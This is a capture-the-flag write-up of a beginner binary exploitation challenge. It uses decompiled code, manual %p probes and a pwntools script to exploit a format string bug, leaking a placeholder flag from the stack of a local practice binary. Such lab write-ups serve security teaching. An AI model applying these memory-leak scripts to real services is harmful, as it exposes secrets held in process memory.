### Binary Exploitation

### Source: Intigriti_22

### Basic File Check

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/search_engine]
└─$ file search_engine         
search_engine: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=96fdf35c8cf22bdbe64c6d8b3b369b8593ee9c8a, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/search_engine]
└─$ checksec search_engine 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/search_engine/search_engine'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We're working with x64 binary. The protection enabled are NX & PIE

No canary present 

I'll run the binary to know what it does

```
 ─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/search_engine]
└─$ ./search_engine  
   _____                                _         ______                   _
  / ____|                              | |       |  ____|                 (_)
 | (___     ___    __ _   _ __    ___  | |__     | |__     _ __     __ _   _   _ __     ___
  \___ \   / _ \  / _` | | '__|  / __| | '_ \    |  __|   | '_ \   / _` | | | | '_ \   / _ \
  ____) | |  __/ | (_| | | |    | (__  | | | |   | |____  | | | | | (_| | | | | | | | |  __/
 |_____/   \___|  \__,_| |_|     \___| |_| |_|   |______| |_| |_|  \__, | |_| |_| |_|  \___|
                                                                    __/ |
                                                                   |___/
Search: lol
No result found. You searched for - lol
```

We see that what we searched for is printed out to us

I'll decompile the binary using ghidra

```

undefined8 main(void)

{
  int iVar1;
  char input [32];
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined2 local_18;
  char local_d;
  int local_c;
  
  local_38 = 0x6c6166207475707b;
  local_30 = 0x202c657265682067;
  local_28 = 0x20747361656c7461;
  local_20 = 0x7372616863203233;
  local_18 = 0x7d;
  puts("   _____                                _         ______                   _");
  puts("  / ____|                              | |       |  ____|                 (_)");
  puts(" | (___     ___    __ _   _ __    ___  | |__     | |__     _ __     __ _   _   _ __     ___"
      );
  puts(
      "  \\___ \\   / _ \\  / _` | | \'__|  / __| | \'_ \\    |  __|   | \'_ \\   / _` | | | | \'_ \ \   / _ \\"
      );
  puts(
      "  ____) | |  __/ | (_| | | |    | (__  | | | |   | |____  | | | | | (_| | | | | | | | |  __/"
      );
  puts(
      " |_____/   \\___|  \\__,_| |_|     \\___| |_| |_|   |______| |_| |_|  \\__, | |_| |_| |_|  \\ ___|"
      );
  puts("                                                                    __/ |");
  puts("                                                                   |___/");
  printf("Search: ");
  local_c = 0;
  while( true ) {
    iVar1 = getchar();
    local_d = (char)iVar1;
    if (((local_d == -1) || (local_d == '\r')) || (local_d == '\n')) break;
    if (local_c < 0x19) {
      iVar1 = tolower((int)local_d);
      input[local_c] = (char)iVar1;
      local_c = local_c + 1;
    }
  }
  input[local_c] = '\0';
  iVar1 = strcmp(input,"help");
  if (iVar1 == 0) {
    puts("From today, dialing 999 won\'t get you the emergency services. And that\'s not");
    puts("the only thing that\'s changing. Nicer ambulances, faster response times an");
    puts("better-looking drivers mean they\'re not just \"the\" emergency services - they\'re");
    puts("\"your\" emergency services. So, remember the new number:\n");
    printf("0118 999 881 999 119 725 3");
  }
  else {
    iVar1 = strcmp(input,"intigriti");
    if (iVar1 == 0) {
      puts("Intigriti helps companies protect themselves from cybercrime. Our community of");
      puts("ethical hackers provides continuous, realistic security testing to protect our");
      printf(&DAT_001024c0);
    }
    else {
      iVar1 = strcmp(input,"swag");
      if (iVar1 == 0) {
        printf("Please visit https://https://swag.intigriti.com/");
      }
      else {
        iVar1 = strcmp(input,"voucher");
        if (iVar1 == 0) {
          printf("Please visit https://bit.ly/3o2R1zV (first come first served)");
        }
        else {
          iVar1 = strcmp(input,"flag");
          if (iVar1 == 0) {
            puts("     ___");
            puts("     \\_/");
            puts("      |._");
            puts("      |\'.\"-._.-\"\"--.-\"-.__.-\'/");
            puts("      |  \\       .-.        (");
            puts("      |   |     (@.@)        )");
            puts("      |   |   \'=.|m|.=\'     /");
            puts(" jgs  |  /    .=\'`\"``=.    /");
            puts("      |.\'                 (");
            puts("      |.-\"-.__.-\"\"-.__.-\"-.)");
            puts("      |");
            puts("      |");
            puts("      |");
          }
          else {
            iVar1 = strcmp(input,"id");
            if (iVar1 != 0) {
              iVar1 = strcmp(input,"pwd");
              if (iVar1 != 0) {
                iVar1 = strcmp(input,"ls");
                if (iVar1 != 0) {
                  iVar1 = strcmp(input,"whoami");
                  if (iVar1 != 0) {
                    printf("No result found. You searched for - ");
                    printf(input);
                    goto LAB_001014c2;
                  }
                }
              }
            }
            printf("Please visit https://www.youtube.com/watch?v=dQw4w9WgXcQ");
          }
        }
      }
    }
  }
LAB_001014c2:
  printf("\n",&local_38);
  return 0;
}
```

It's quite much lol i won't explain deeply whats happening cause its quite self explanatory

But what is needed is that it stores some value in the stack and the input we search when printed out doesn't use a format specifier

```
 printf(input);
 ```
 
 Now this is a format string vulnerability
 
 So decoding the value stored in the stack
 
 ```
 ┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/search_engine]
└─$ echo 0x7d0x73726168632032330x20747361656c74610x202c6572656820670x6c6166207475707b | xxd -r -p | rev
{put falg here, atleast 32 chars} 
```

So the flag is stored there

Now with this format string vulnerability i can leak address from the stack

Like this:

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/search_engine]
└─$ ./search_engine  
   _____                                _         ______                   _
  / ____|                              | |       |  ____|                 (_)
 | (___     ___    __ _   _ __    ___  | |__     | |__     _ __     __ _   _   _ __     ___
  \___ \   / _ \  / _` | | '__|  / __| | '_ \    |  __|   | '_ \   / _` | | | | '_ \   / _ \
  ____) | |  __/ | (_| | | |    | (__  | | | |   | |____  | | | | | (_| | | | | | | | |  __/
 |_____/   \___|  \__,_| |_|     \___| |_| |_|   |______| |_| |_|  \__, | |_| |_| |_|  \___|
                                                                    __/ |
                                                                   |___/
Search: %p %p %p %p %p
No result found. You searched for - 0x5619f5dfe6b8 (nil) (nil) 0x5619f6ca5000 0x21001
```

So i can get the address where our input is stored on the stack

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/search_engine]
└─$ ./search_engine
   _____                                _         ______                   _
  / ____|                              | |       |  ____|                 (_)
 | (___     ___    __ _   _ __    ___  | |__     | |__     _ __     __ _   _   _ __     ___
  \___ \   / _ \  / _` | | '__|  / __| | '_ \    |  __|   | '_ \   / _` | | | | '_ \   / _ \
  ____) | |  __/ | (_| | | |    | (__  | | | |   | |____  | | | | | (_| | | | | | | | |  __/
 |_____/   \___|  \__,_| |_|     \___| |_| |_|   |______| |_| |_|  \__, | |_| |_| |_|  \___|
                                                                    __/ |
                                                                   |___/
Search: aaaa%p%p%p%p%p%p%p%p%p%p%p%p
No result found. You searched for - aaaa0x5590826ca6b8(nil)(nil)0x5590838090000x210010x70257025616161610x70257025702570250x70257025702570250x250x6c6166207475707b

```

With this it seems our input is stored at offset 6 

```
└─$ ./search_engine
   _____                                _         ______                   _
  / ____|                              | |       |  ____|                 (_)
 | (___     ___    __ _   _ __    ___  | |__     | |__     _ __     __ _   _   _ __     ___
  \___ \   / _ \  / _` | | '__|  / __| | '_ \    |  __|   | '_ \   / _` | | | | '_ \   / _ \
  ____) | |  __/ | (_| | | |    | (__  | | | |   | |____  | | | | | (_| | | | | | | | |  __/
 |_____/   \___|  \__,_| |_|     \___| |_| |_|   |______| |_| |_|  \__, | |_| |_| |_|  \___|
                                                                    __/ |
                                                                   |___/
Search: aaaa%6$p
No result found. You searched for - aaaa0x7024362561616161
```

We can use this approach to leak address that is in the stack. But doing it manually will take time 

So here's the script to solve it 

```
from pwn import *

context.log_level = 'info'

flag = ''

# Let's fuzz x values
for i in range(100):
    try:
        # Connect to server
        io = process('./search_engine', level='warn')
        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendline('%{}$p'.format(i).encode())
        # Receive the response (leaked address followed by '.' in this case)
        io.recvuntil(b'No result found. You searched for - ')
        result = io.recv()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up flag
                flag += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print and close
info(flag)
```
What it does is that it automates the process of sending %p which will get various address of the stack, it then it will attempt to get the string of it

Why am doing this is so that we can leak the string of the flag stored at the stack

On running it 

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/search_engine]
└─$ python2 fuzz.py
0: %0$p

1: 0x5620aa8096b8

\xb8\x96\x80\xaa V
4: 0x5575025df000

\x00]uU
5: 0x21001

\x10
6: 0x70243625

%6$p
10: 0x6c6166207475707b

{put fal
11: 0x202c657265682067

g here, 
12: 0x20747361656c7461

atleast 
13: 0x7372616863203233

32 chars
14: 0x7d

}
15: 0x50a1fcad0

��\x1f\x05
16: 0x1


17: 0x7f3b7867818a

\x8a\x81gx;\x7f
18: 0x7ffcf7c0d690

\x90����
19: 0x5603e4cea175

u\xa1��\x03
20: 0x196138040

@\x80\x13
[[--------------------SNIP-------------------]]
97: 0x7ffd4f01f878

x�O�
98: 0x7fff27e4d8b0

\xb0��'\xff\x7f
99: 0x7ffe1ad778ce

�x�▒\xfe\x7f
[*] \x10%6$p{put falg here, atleast 32 chars} P! I\x7f
    8
```

So if you notice the offset at 11 to offset 16 thats where the flag is stored 

With this here's the modified code

```
from pwn import *

context.log_level = 'info'

flag = ''

# Let's fuzz x values
for i in range(6, 15):
    try:
        # Connect to server
        io = process('./search_engine', level='warn')
        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendline('%{}$p'.format(i).encode())
        # Receive the response (leaked address followed by '.' in this case)
        io.recvuntil(b'No result found. You searched for - ')
        result = io.recv()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up flag
                flag += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print and close
info(flag)
```

Running it still leaks the flag in the stack 😉

```
└─$ python2 fuzz.py
6: 0x70243625

%6$p
10: 0x6c6166207475707b

{put fal
11: 0x202c657265682067

g here, 
12: 0x20747361656c7461

atleast 
13: 0x7372616863203233

32 chars
14: 0x7d

}
[*] %6$p{put falg here, atleast 32 chars}
```

There isn't any remote server for me to connect to cause its down but that is how the exploit will also work on the remote server

And we're done 

<br> <br>
[Back To Home](../../index.md)

